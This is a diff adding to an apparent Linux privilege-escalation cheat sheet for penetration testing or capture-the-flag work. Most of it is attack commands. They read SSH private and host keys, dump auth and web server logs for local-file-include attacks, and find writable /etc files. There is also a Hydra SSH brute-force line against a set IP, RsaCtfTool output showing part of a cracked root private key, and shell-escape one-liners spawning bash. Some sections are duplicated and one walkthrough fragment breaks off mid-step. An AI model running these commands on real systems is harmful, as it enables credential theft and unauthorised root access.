@@ -205,6 +205,14 @@ Anything "interesting" in the home directorie(s)? If it's possible to access:
 ls -ahlR /root/
 ls -ahlR /home/
 
+Web Root
+Any settings/files (hidden) on website? Any settings file with database information?
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+
 Check:
  /
  /dev 
@@ -644,6 +652,15 @@ cat /etc/my.conf
 
 // Inetd Configuration
 cat /etc/inetd.conf
+
+File Systems
+Which configuration files can be written in /etc/? Able to reconfigure a service?
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+find /etc/ -readable -type f 2>/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
 ```
 
 ## Processes
@@ -911,17 +928,175 @@ cat /etc/shadow
 ls -alh /var/mail/
 
 Scripts / Databases / Configuration / Log Files
-// Are there any hardcoded passwords in scripts, databases or configuration files
-Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
+// Are there any hardcoded passwords in scripts, databases or configuration files?
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
 
+Is there anything in the log file(s) (Could help with "Local File Includes"!)
+// Check Local Log Files
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
 
+Note: Look for: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+```
 
+## SSH Keys
+```
+./ssh
+Look for hidden files & directories in the system root:
+ls -la /
 
+Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
+ls -l /.ssh
 
+Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.
+Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
 
+Private Keys 
+Can private-key information be found?
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+
+Can public-key information be found? Give RsaCTFtool a shot:
+Crack Public Key
+RsaCtfTool that will try a bunch of different well known cryptography attacks against a public key.
+Clone it to machine, run it, giving it the public key and --private so that it will show the private key if it cracks it. After a few minutes, it does:
+
+mute@straylight$ /opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private 
+
+[*] Testing key rootauthorizedsshkey.pub.
+[*] Performing factordb attack on rootauthorizedsshkey.pub.
+[*] Performing fibonacci_gcd attack on rootauthorizedsshkey.pub.
+100%| 9999/9999 [00:00<00:00, 157548.15it/s]
+[*] Performing system_primes_gcd attack on rootauthorizedsshkey.pub.
+100 7007/7007 [00:00<00:00, 1363275.26it/s]
+[*] Performing pastctfprimes attack on rootauthorizedsshkey.pub.
+100 113/113 [00:00<00:00, 1419030.99it/s]
+[*] Performing nonRSA attack on rootauthorizedsshkey.pub.
+...[snip]...
+[*] Attack success with wiener method !
+
+Results for rootauthorizedsshkey.pub:
+
+Private key :
+-----BEGIN RSA PRIVATE KEY-----
+MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
+...[snip]...
+hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
+-----END RSA PRIVATE KEY-----
+
+I’ll save that to a file and chmod it to 600 so SSH will use it.
+
+SSH Bruteforce Hydra:
+hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
+```
+
+## /var
+```
+/var
+What can be found in /var/ ?
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+```
+
+## Web Root Locations
+```
+Web Root
+Any settings/files (hidden) on website? Any settings file with database information?
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+```
+
+## git?
+```
+.git
+Any .git files?
+find / -type d -name '.git' 2>/dev/null
+```
+
+## Shell Escapes
+```
+Shell Upgrade
+If commands are limited, can you use common shell escape sequences?
+echo os.system('/bin/bash')
+/bin/sh -i
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Additional Functionality
+CTRL + Z
+stty raw -echo; fg
+enter
+export TERM=xterm-256color
+
+:!bash vi, vim
+:set shell=/bin/bash:shell vi, vim
+!bash man, more, less
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; find
+awk 'BEGIN {system("/bin/bash")}' awk
+--interactive nmap
+perl -e 'exec "/bin/bash";' Perl 
+```
+
+## 
 
 
 
